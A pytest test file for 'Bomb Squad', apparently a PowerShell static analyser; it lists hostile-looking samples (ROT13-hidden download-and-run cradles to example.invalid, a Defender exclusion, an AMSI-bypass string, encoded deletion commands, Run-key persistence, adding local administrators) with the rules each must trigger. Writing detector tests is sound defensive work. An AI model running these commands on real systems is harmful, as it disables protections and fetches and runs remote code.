"""Each case is a construct Bomb Squad must recognise. All of them were missed by Bomb Squad
v1.0.0, which matched 12 command names and `iex` by exact name only, except the last four,
which must stay quiet."""

from __future__ import annotations

import codecs

import pytest

from bombsquad.model import Level
from tests.conftest import analyse, encoded

REMOVE = "Remove-Item C:\\x"

# Samples that antivirus products flag are kept ROT13-encoded and decoded at run time
# (see conftest.py). {E} is replaced by an encoded `Remove-Item C:\x`.
_HIDDEN = {
    "char_join": "& (-wbva [pune[]](105,101,120)) 'Erzbir-Vgrz P:\\k'",
    "encoded": "cbjrefuryy -rap {R}",
    "encoded_en_dash": "cbjrefuryy \u2013rap {R}",
    "start_process_encoded": "Fgneg-Cebprff cbjrefuryy -NethzragYvfg '-j uvqqra -rap {R}'",
    "base64_literal": "[Pbaireg]::SebzOnfr64Fgevat('{R}')",
    "cradle_inline": "VRK (Arj-Bowrpg Arg.JroPyvrag).QbjaybnqFgevat('uggc://rknzcyr.vainyvq/n')",
    "cradle_pipe": "vez uggc://rknzcyr.vainyvq/n | vrk",
    "cradle_variable": "$c = vje uggc://rknzcyr.vainyvq/n\nvrk $c.Pbagrag",
    "defender_exclusion": "Nqq-ZcCersrerapr -RkpyhfvbaCngu P:\\ ",
    "amsi_folded": "[Ers].Nffrzoyl.TrgGlcr('Flfgrz.Znantrzrag.Nhgbzngvba.'+'Nz'+'fv'+'Hgvyf')",
}


def hidden(name: str) -> str:
    return codecs.decode(_HIDDEN[name], "rot13").replace("{E}", encoded(REMOVE))


CASES: dict[str, tuple[str, set[str]]] = {
    # Aliases and native tools
    "alias_rm": ("rm -Recurse -Force C:\\x", {"BS-FS-001"}),
    "alias_del": ("del C:\\temp\\notes.txt", {"BS-FS-001"}),
    "reg_add": ('reg add "HKCU\\Software\\Demo" /v Enabled /t REG_DWORD /d 1 /f', {"BS-RG-001"}),
    "schtasks": ("schtasks /create /tn Updater /tr notepad.exe /sc onlogon", {"BS-TS-001"}),
    "net_user": ("net user demo /add", {"BS-ID-001"}),
    "sc_create": ("sc.exe create DemoSvc binPath= C:\\demo.exe", {"BS-TS-001"}),
    "module_qualified": ("Microsoft.PowerShell.Management\\Remove-Item C:\\x", {"BS-FS-001"}),
    # Names built from literals
    "folded_name": ("& ('Remove-' + 'Item') C:\\temp", {"BS-FS-001"}),
    "char_join": (hidden("char_join"), {"BS-DE-001", "BS-FS-001"}),
    # Text turned into code
    "scriptblock_create": ("[ScriptBlock]::Create($text)", {"BS-DE-002"}),
    "iex_literal": (f"Invoke-Expression '{REMOVE}'", {"BS-DE-001", "BS-FS-001"}),
    "add_type": ("Add-Type -TypeDefinition $source", {"BS-DE-004"}),
    "dynamic_call": ("& $tool -x", {"BS-DE-003"}),
    # Encoded commands, decoded and analysed
    "encoded": (hidden("encoded"), {"BS-EN-001", "BS-FS-001"}),
    "encoded_en_dash": (hidden("encoded_en_dash"), {"BS-EN-001", "BS-FS-001"}),
    "start_process_encoded": (hidden("start_process_encoded"), {"BS-EN-001", "BS-FS-001"}),
    "command_switch": (f'powershell -NoProfile -c "{REMOVE}"', {"BS-FS-001"}),
    "base64_literal": (hidden("base64_literal"), {"BS-EN-002", "BS-FS-001"}),
    # Downloads, and downloads that are run
    "download_only": ("Invoke-WebRequest http://example.invalid/a -OutFile a.zip",
                      {"BS-NET-001"}),
    "cradle_inline": (hidden("cradle_inline"), {"BS-NET-002"}),
    "cradle_pipe": (hidden("cradle_pipe"), {"BS-NET-002"}),
    "cradle_variable": (hidden("cradle_variable"), {"BS-NET-002"}),
    # Security tooling
    "defender_exclusion": (hidden("defender_exclusion"), {"BS-SS-002"}),
    "amsi_folded": (hidden("amsi_folded"), {"BS-AV-001"}),
    "run_key": ("Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
                "-Name x -Value y", {"BS-RG-002"}),
    # Shadowing is reported, not hidden
    "shadowed": ("function Remove-Item { }\nRemove-Item C:\\x", {"BS-FS-001"}),
    # Must stay quiet
    "assembly_only": ("Add-Type -AssemblyName System.Windows.Forms", set()),
    "file_property": ("Set-ItemProperty -Path C:\\file.txt -Name IsReadOnly -Value $true", set()),
    "benign": ("Get-ChildItem C:\\x | Where-Object Length -gt 1", set()),
    "data_base64": ("[Convert]::FromBase64String('AAECAwQFBgcICQ==')", {"BS-EN-002"}),
}


@pytest.fixture(scope="module")
def analysed():
    return analyse({name: source for name, (source, _) in CASES.items()})


@pytest.mark.parametrize("name", list(CASES))
def test_rules(name, analysed, rule_ids):
    _, findings, _ = analysed
    assert rule_ids(findings[name]) == CASES[name][1]


def test_admin_group_is_high():
    _, findings, _ = analyse({"admins": "net localgroup administrators demo /add"})
    assert [f.level for f in findings["admins"]] == [Level.HIGH]


def test_decoded_findings_point_at_the_encoded_command(analysed):
    _, findings, _ = analysed
    deletion = next(f for f in findings["encoded"] if f.rule.id == "BS-FS-001")
    assert (deletion.region.line, deletion.region.column) == (1, 1)
    assert deletion.via[0].startswith("decoded from -EncodedCommand at line 1")


def test_folded_name_says_how(analysed):
    _, findings, _ = analysed
    assert "built from string literals" in findings["folded_name"][0].via[0]


def test_shadowing_is_a_limitation(analysed):
    _, findings, _ = analysed
    assert any("defines a function named Remove-Item" in note
               for note in findings["shadowed"][0].limitations)


def test_cradle_replaces_the_separate_findings(analysed):
    _, findings, _ = analysed
    for name in ("cradle_inline", "cradle_pipe", "cradle_variable"):
        assert len(findings[name]) == 1, name


def test_parse_errors_are_reported_and_rules_still_run():
    _, findings, results = analyse({"broken": "Remove-Item C:\\x\nif ( {"})
    assert results["broken"].parse_errors
    assert {f.rule.id for f in findings["broken"]} == {"BS-FS-001"}
